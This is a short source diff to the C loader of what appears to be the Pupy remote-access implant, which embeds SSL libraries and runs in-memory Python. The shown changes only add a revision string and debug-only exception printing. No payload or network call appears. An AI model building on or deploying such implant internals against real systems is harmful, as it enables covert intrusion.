@@ -26,6 +26,8 @@
 #include "resources_libssl_so.c"
 #include "resources_libcrypto_so.c"
 
+#include "revision.h"
+
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
 
@@ -68,6 +70,9 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     PyGILState_STATE restore_state;
 
     struct rlimit lim;
+
+    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
+
     if (getrlimit(RLIMIT_NOFILE, &lim) == 0) {
         lim.rlim_cur = lim.rlim_max;
         setrlimit(RLIMIT_NOFILE, &lim);
@@ -161,8 +166,12 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
             if (seq) {
                 PyObject *discard = PyEval_EvalCode((PyCodeObject *)sub, d, d);
                 if (!discard) {
-                    dprint("discard\n");
+#ifdef DEBUG
+                    PyObject *ptype, *pvalue, *ptraceback;
+                    PyErr_Fetch(&ptype, &pvalue, &ptraceback);
+                    dprint("SEQ %d EXCEPTION: %s\n", i, PyString_AsString(pvalue));
                     PyErr_Print();
+#endif
                     rc = 255;
                 }
                 Py_XDECREF(discard);
